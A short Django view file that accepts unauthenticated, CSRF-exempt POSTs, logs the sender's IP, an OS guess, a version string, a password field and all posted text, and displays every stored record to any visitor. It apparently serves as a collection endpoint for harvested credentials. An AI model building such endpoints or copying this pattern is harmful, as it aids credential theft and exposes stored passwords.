from django.core.checks.messages import Info
from django.http.request import HttpRequest
from django.shortcuts import render
from django.http import HttpResponse
from .models import Informacion
from django.views.decorators.csrf import csrf_exempt
import gzip
# Create your views here.

@csrf_exempt
def index(request):
    
    text = []
    So = 'NONE'
    if(request.method == 'POST'):
        for key, value in request.POST.items():
            if("Microsoft" in key or "Microsoft" in value):
                So = 'Windows'
            text.append(key+value)
        info = Informacion(ip=request.META['REMOTE_ADDR'], so=request.POST.get('so', default=So), version=request.POST.get('version',default='NONE'), contrasenia=request.POST.get('contrasenia',default='NONE'), texto = text)
        Informacion.save(info)
    information = Informacion.objects.all()
    return render(request, 'information_details.html', {'datos':information})

